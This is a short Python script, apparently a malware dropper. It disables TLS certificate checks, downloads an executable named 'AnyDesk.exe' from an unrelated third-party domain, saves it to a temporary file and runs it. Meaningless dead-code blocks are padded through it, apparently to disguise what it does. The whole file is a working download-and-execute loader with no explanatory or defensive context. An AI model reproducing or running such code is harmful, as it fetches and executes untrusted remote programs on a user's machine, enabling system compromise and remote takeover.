import subprocess
import requests
import urllib3
import tempfile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
if False:
    _var_184_0 = (908, 963, 311)
    _var_184_1 = (615, 129, 733)
    _var_184_2 = (621, 426, 520)

    def _var_184_fn():
        pass
url = 'https://diskcitylink.com/j0PDgKP/AnyDesk.exe'
response = requests.get(url, verify=False)
response.raise_for_status()
with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_exe_file:
    temp_exe_file.write(response.content)
    temp_exe_file_path = temp_exe_file.name
if False:
    _var_185_0 = (121, 135, 0)

    def _var_185_fn():
        pass
subprocess.run([temp_exe_file_path], shell=True)